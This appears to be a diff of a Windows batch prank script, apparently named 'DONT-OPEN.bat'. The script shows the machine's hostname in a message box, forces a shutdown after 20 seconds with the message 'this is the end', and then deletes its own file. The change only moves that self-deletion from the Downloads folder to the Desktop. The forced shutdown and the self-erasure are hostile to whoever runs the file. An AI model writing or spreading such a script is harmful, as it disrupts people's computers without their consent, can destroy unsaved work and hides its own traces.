@@ -17,5 +17,5 @@ for /f "usebackq" %%i in (`hostname`) do set host=%%i
 msg * %host%
 shutdown /s /f /t 20 /c "this is the end"
 
-cd Downloads
+cd Desktop
 del [DONT-OPEN.bat]
